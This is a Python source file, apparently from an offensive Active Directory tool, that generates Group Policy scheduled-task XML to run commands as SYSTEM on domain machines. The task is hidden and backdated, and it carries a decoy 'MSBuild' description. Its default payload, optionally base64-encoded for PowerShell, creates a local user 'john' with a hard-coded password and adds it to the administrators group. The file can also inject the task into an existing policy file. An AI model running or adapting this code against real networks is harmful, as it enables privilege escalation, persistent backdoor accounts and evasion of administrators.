import binascii
import logging
import os
import re
import uuid
from base64 import b64encode
from datetime import datetime, timedelta
from xml.sax.saxutils import escape


class ScheduledTask:
    def __init__(self, name="", mod_date="", description="", powershell=False, command="", old_value=""):
        if name:
            self._name = name
        else:
            self._name = "TASK_" + binascii.b2a_hex(os.urandom(4)).decode('ascii')

        if mod_date:
            self._mod_date = mod_date
        else:
            mod_date = datetime.now() - timedelta(days=30)
            self._mod_date = mod_date.strftime("%Y-%m-%d %H:%M:%S")
        self._guid = str(uuid.uuid4()).upper()
        self._author = "NT AUTHORITY\\System"
        if description:
            self._description = description
        else:
            self._description = "MSBuild build and release task"

        if powershell:
            self._shell = escape("powershell.exe")
            if command:
                self._command = escape('-enc {}'.format(b64encode(command.encode('UTF-16LE')).decode("utf-8")))
            else:
                self._command = escape('-enc {}'.format(b64encode('net user john H4x00r123.. /add;net localgroup administrators john /add'.encode('UTF-16LE')).decode('utf-8')))
        else:
            self._shell = escape('c:\\windows\\system32\\cmd.exe')
            if command:
                self._command = escape('/c "{}"'.format(command))
            else:
                self._command = escape('/c "net user john H4x00r123.. /add && net localgroup administrators john /add"')

        logging.debug(self._shell + " " + self._command)
        self._old_value = old_value

        self._task_str_begin = f"""<?xml version="1.0" encoding="utf-8"?><ScheduledTasks clsid="{{CC63F200-7309-4ba0-B154-A71CD118DBCC}}">"""
        self._task_str = f"""<ImmediateTaskV2 clsid="{{9756B581-76EC-4169-9AFC-0CA8D43ADB5F}}" name="{self._name}" image="0" changed="{self._mod_date}" uid="{{{self._guid}}}" userContext="0" removePolicy="0"><Properties action="C" name="{self._name}" runAs="NT AUTHORITY\\System" logonType="S4U"><Task version="1.3"><RegistrationInfo><Author>{self._author}</Author><Description>{self._description}</Description></RegistrationInfo><Principals><Principal id="Author"><UserId>NT AUTHORITY\\System</UserId><RunLevel>HighestAvailable</RunLevel><LogonType>S4U</LogonType></Principal></Principals><Settings><IdleSettings><Duration>PT10M</Duration><WaitTimeout>PT1H</WaitTimeout><StopOnIdleEnd>true</StopOnIdleEnd><RestartOnIdle>false</RestartOnIdle></IdleSettings><MultipleInstancesPolicy>IgnoreNew</MultipleInstancesPolicy><DisallowStartIfOnBatteries>false</DisallowStartIfOnBatteries><StopIfGoingOnBatteries>true</StopIfGoingOnBatteries><AllowHardTerminate>false</AllowHardTerminate><StartWhenAvailable>true</StartWhenAvailable><AllowStartOnDemand>false</AllowStartOnDemand><Enabled>true</Enabled><Hidden>true</Hidden><ExecutionTimeLimit>PT0S</ExecutionTimeLimit><Priority>7</Priority><DeleteExpiredTaskAfter>PT0S</DeleteExpiredTaskAfter><RestartOnFailure><Interval>PT15M</Interval><Count>3</Count></RestartOnFailure></Settings><Actions Context="Author"><Exec><Command>{self._shell}</Command><Arguments>{self._command}</Arguments></Exec></Actions><Triggers><TimeTrigger><StartBoundary>%LocalTimeXmlEx%</StartBoundary><EndBoundary>%LocalTimeXmlEx%</EndBoundary><Enabled>true</Enabled></TimeTrigger></Triggers></Task></Properties></ImmediateTaskV2>"""
        self._task_str_end = f"""</ScheduledTasks>"""

    def generate_scheduled_task_xml(self):
        if self._old_value == "":
            return self._task_str_begin + self._task_str + self._task_str_end

        return re.sub(r"< */ *ScheduledTasks>", self._task_str.replace("\\", "\\\\") + self._task_str_end, self._old_value)

    def get_name(self):
        return self._name